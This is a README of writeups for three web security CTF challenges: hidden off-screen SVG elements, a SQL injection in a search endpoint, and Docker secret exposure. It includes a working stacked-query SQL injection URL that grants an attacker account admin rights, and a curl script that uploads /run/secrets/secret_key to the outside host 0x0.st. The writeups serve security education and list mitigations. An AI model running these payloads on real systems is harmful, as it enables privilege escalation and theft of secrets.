# 🚩 Web Security Challenges Writeup

## Overview

This repository contains writeups for three web security challenges that demonstrate various vulnerabilities and exploration techniques.

## 📌 Challenges

### 1. 9ach9ach Challenge: Hidden SVG Exploration 🕵️

#### Challenge Concept
A challenge designed to sharpen browser developer tool skills by identifying hidden SVG elements strategically positioned outside the visible viewport.

#### 🔍 Technique Demonstrated
```html
<svg style="position:absolute; bottom:-500px;" xmlns="http://www.w3.org/2000/svg">
<svg style="position:absolute; top:-500px;" xmlns="http://www.w3.org/2000/svg">
<svg style="position:absolute; right:-500px;" xmlns="http://www.w3.org/2000/svg">
```

#### 🎯 Learning Objectives
- Master browser developer tools
- Understand CSS positioning techniques
- Recognize hidden page elements

#### 💡 Solution Approach
1. Open browser developer tools (F12 or Right-click > Inspect)
2. Navigate to the Elements tab
3. Search for SVG elements positioned off-screen
4. Examine hidden elements for potential clues

### 2. L3OMDA Challenge: SQL Injection Vulnerability 💉

#### Challenge Concept
Demonstrates a classic SQL injection vulnerability in a user registration and search system, allowing privilege escalation.

#### 🕳️ Vulnerability Details
Exploits a search functionality vulnerable to SQL injection, enabling unauthorized admin access.

#### 💥 Exploitation Payload
```bash
http://localhost:5000/search?q=%25%27%20%3B%20INSERT%20INTO%20roles_users(user_id,role_id)%20VALUES((SELECT%20id%20FROM%20%22user%22%20WHERE%20email%3D%27attacker@example.com%27),(SELECT%20id%20FROM%20role%20WHERE%20name%3D%27admin%27))%20%3B%20--%20
```

#### 🛡️ Mitigation Strategies
- Use parameterized queries
- Implement robust input validation
- Apply least privilege principle
- Utilize prepared statements

### 3. L7ota Challenge: Docker Secrets Exposure 🐳

#### Challenge Concept
Tests understanding of Docker configurations and secret management, focusing on extracting a hidden secret key.

#### 🚀 Exploitation Technique
Locate and exfiltrate a secret key stored in Docker's secrets management system.

#### 📜 Payload Script
```bash
#!/bin/bash
curl -F'file=@/run/secrets/secret_key' https://0x0.st
```

#### 🔒 Security Recommendations
- Implement strict access controls on secret files
- Use environment-specific secret management solutions
- Regularly rotate and audit secrets
- Add multiple layers of access verification

## 🔑 Key Learning Outcomes

- 🕵️ Detect hidden web elements
- 💉 Understand SQL injection techniques
- 🐳 Explore Docker secret management
- 🛡️ Implement secure coding practices

## ⚠️ Disclaimer

> **Warning**: These challenges are for educational purposes only. Always obtain proper authorization before testing security mechanisms.

## 📚 Further Reading
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Docker Secrets Management](https://docs.docker.com/engine/swarm/secrets/)
- [Web Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)

## 🤝 Contributions
Contributions, corrections, and improvements are welcome! Please open an issue or submit a pull request.

---

*Happy Hacking! 🖥️🔐*